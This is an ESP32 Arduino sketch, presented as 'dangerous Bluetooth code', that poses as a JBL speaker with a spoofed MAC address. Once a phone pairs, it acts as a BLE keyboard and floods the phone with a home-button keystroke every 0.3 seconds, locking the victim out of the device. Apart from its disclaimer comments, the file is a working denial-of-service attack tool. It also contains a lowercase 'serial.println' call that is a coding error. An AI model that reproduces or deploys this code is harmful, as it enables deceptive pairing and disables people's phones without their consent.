//               !!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
// !!!!!!! THIS IS FOR EDUCATIONAL PURPOSES ONLY !!!!!!!
// !!!!!!! USE ONLY WITH PERMISSION !!!!!!!
// !!!!!!! I AM NOT RESPONSIBLE FOR ANY DAMAGES OR OTHER BAD ACTIVITIES !!!!!!!
// !!!!!!! DO NOT USE IT FOR ILLEGAL ACTIVITIES !!!!!!!
// Hello, Iam Fattcat and this is Dangerous Bluetooth Code to get Mobile Cell Phones into "Trap".

// Credits to Fattcat

//                            ? How it works ?
// -- Well, like this
// ---- Device will be paired with THIS esp32 code then it locks with "KEY_MEDIA_WWW_HOME"
// ---- Then it CAN NOT BE TURNED OFF by pressing Turn OFF Button on side of phone
// ---- And I think also more DISABLED Types ...
// ------------------------------------------------------------------------------------------------
// -- ! CRITICAL BUGS (THAT MIGHT HAPPEN TO YOUR "TARGET" DEVICE !
// ---- CAN NOT show opened apps (like ALT TAB on PC)
// ---- On some Moble Phones MUST be restarted WHOLE PHONE (After Attacking) !
// ------------------------------------------------------------------------------------------------

#include <BleKeyboard.h>
// BLE Keyboard
BleKeyboard bleKeyboard("JBL Xtreme", "Custom Manufacturer", 1000); // Increased Time to 1000

//                              Set HERE YOUR MAC address
const uint8_t customMacAddr[] = {0xF4, 0xF3, 0xAA, 0x07, 0xE4, 0xF2};

void setup() {
  Serial.begin(115200);
  Serial.println("Starting BLE work!");

  // set ! CUSTOM MAC ADDRESS !
  esp_base_mac_addr_set(customMacAddr);
  Serial.print("Set MAC address to : ");
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", customMacAddr[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println();

  // Initialize BLE Keyboard
  bleKeyboard.begin();
}

void loop() {
  // Check if is device connected (sometimes send message but isnt actually connected)
  if (bleKeyboard.isConnected()) {
    Serial.println("BLE Device connected!");

    // Send Medial button WWW_HOME
    Serial.println("Sending Button: WWW_HOME");
    bleKeyboard.write(KEY_MEDIA_WWW_HOME);

    // SEND KEYSTROKE EVERY 0.3 Seconds
    // Ensures now will be phone (or connected device TRAPPED and cannot use phone enymore) 
    delay(300);
    serial.println("");
  } else {
    Serial.println("Waiting for connection on BLE Device...");
  }

  delay(100);
}
